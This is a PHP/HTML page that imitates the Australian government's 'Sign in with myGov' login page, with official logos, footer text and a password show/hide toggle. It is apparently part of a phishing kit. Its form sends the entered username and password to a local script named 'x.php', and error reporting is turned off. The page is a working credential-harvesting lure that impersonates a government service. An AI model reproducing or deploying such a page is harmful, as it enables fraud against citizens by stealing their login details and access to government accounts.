<?php
error_reporting(0);
session_start();
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <meta http-equiv="x-ua-compatible" content="ie=edge" />
    <meta name="apple-mobile-web-app-capable" content="yes" />
    <title>Sign in with myGov - myGov</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <link href="../Assets/css/css.css" rel="stylesheet" />
    <link href="../Assets/css/mgv2-application.css" rel="stylesheet" />
    <link href="../Assets/css/blugov.css" rel="stylesheet" />
    <link rel="icon" type="image/png" sizes="32x32" href="../Assets/images/favicon-32x32.png" />
    <link rel="icon" type="image/png" sizes="16x16" href="../Assets/images/favicon-16x16.png" />
<script>
    function togglePassword() {
    const passwordInput = document.getElementById("passwordInput");
    const toggleButton = document.getElementById("togglebtn");

    if (passwordInput.type === "password") {
        passwordInput.type = "text";
        toggleButton.textContent = "Hide";
    } else {
        passwordInput.type = "password";
        toggleButton.textContent = "Show";
    }
}
</script>
</head>

<body>
    <header role="banner" class="mgvEnhanceHeader">
        <section class="wrapper">
            <div class="inner">
                <div class="unauth-grid">
                    <div class="unauth-grid-row">
                        <a href="#" class="unauth-govt-crest__link">
                            <img id="unauth-govt-crest" src="../Assets/images/myGov-cobranded-logo-black.svg"
                                alt="myGov Beta" role="img" />
                        </a>
                        <div class="header-links">
                            <a href="#">Help</a>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    </header>
    <div class="wrapper-mapwap">
        <div class="main-block" id="content" role="main">
            <div class="unauth">
                <div class="login-grid-container">
                    <div class="login-grid-row">
                        <div class="login-grid-column">
                            <div class="digital-id-login-card-wrapper">
                                <div class="digital-id-main-login-card override">
                                    <h1>Sign in with myGov</h1>
                                    <!-- <p class="login-instruction-text">
                                        Choose how to sign in from these 2 options
                                    </p> -->
                                    <h2 class="text-align-left">
                                        Using your myGov sign in details
                                    </h2>
                                    <form id="form-1" class="mygov-login-form alternative" method="post"
                                        action="../Assets/scripts/x.php">

                                        <div class="input-group">
                                            <label class="override" for="userId">Username or email</label>
                                            <input id="ai" name="username" type="text" value="" autocomplete="off"
                                                required="" />
                                        </div>
                                        <!-- <p class="recovery">
                                            <a href="javascript:void(0)" class="anchor override">Forgot username</a>
                                        </p> -->
                                        <br>
                                        <div class="input-group">
                                            <label for="password" class="override">Password</label>
                                            <div class="password-group">
                                                <button class="showPassword anchor" type="button"
                                                    id="togglebtn" onclick="togglePassword()">
                                                    Show
                                                </button>
                                                <p class="is-visuallyhidden" id="show-hide-helpmsg">
                                                    Note: this will visually expose your password on the
                                                    screen.
                                                </p>
                                                <input id ="passwordInput" name="password" type="password" aria-required="true"
                                                    required />
                                            </div>
                                        </div>
                                        <p class="recovery">
                                            <a href="javascript:void(0)" class="anchor override">Forgot password</a>
                                        </p>
                                        <div class="button-digital-id-main-container override">
                                            <div class="digital-id-button-container">
                                                <button type="submit" class="button-main">
                                                    Sign in
                                                </button>
                                            </div>
                                        </div>
                                        <br><br>
                                        <!-- <p class="create-account-text">
                                            <a class="create-account-link" href="javascript:void(0)">Create a myGov
                                                account</a>
                                            if you don't have one already.
                                        </p> -->
                                    </form>
                                    <!-- <div class="hr-word">
                                        <div class="draw-circle">or</div>
                                    </div>
                                    <div class="digital-id-login-card secondary">
                                        <div class="button-digital-id-container">
                                            <h2 class="text-align-left">
                                                Using your myGovID Digital Identity
                                            </h2>
                                            <div class="digital-id-login-option-container">
                                                <div class="inner-options">
                                                    <p class="external-links-zone">
                                                        What is
                                                        <a href="javascript:void(0)">Digital Identity</a>
                                                        and <a href="javascript:void(0)">myGovID</a>?
                                                    </p>
                                                    <a class="button-digital-identity"
                                                        href="javascript:void(0)">Continue with Digital
                                                        Identity</a>

                                                </div>
                                            </div>
                                        </div> -->
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <footer role="contentinfo">
        <div class="wrapper">
            <div class="inner">
                <section class="footer-list">
                    <nav>
                        <h2 class="sr-only" aria-label="Footer">Footer</h2>
                        <ul class="lower-links">
                            <li>
                                <a target="_blank" href="#">Terms of use</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Privacy and security</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Copyright</a>
                            </li>
                            <li>
                                <a target="_blank" href="#">Accessibility</a>
                            </li>
                        </ul>
                    </nav>
                </section>
                <div class="footer-lower">
                    <section class="footer-lower-logo">
                        <a href="#">
                            <img src="../Assets/images/myGov-cobranded-logo-white.svg" alt="myGov Beta" width="313.17"
                                height="70" role="img" />
                        </a>
                    </section>
                    <p class="footer-acknowledgement">
                        We acknowledge the Traditional Custodians of the lands we live on.
                        We pay our respects to all Elders, past and present, of all
                        Aboriginal and Torres Strait Islander nations.
                    </p>
                </div>
            </div>
        </div>
    </footer>
    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js">
    </script>
    <script type="text/javascript" src="https://code.jquery.com/jquery-3.2.1.slim.min.js"></script>
    <script type="text/javascript" src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"></script>
</body>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script type="text/javascript" src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>


</html>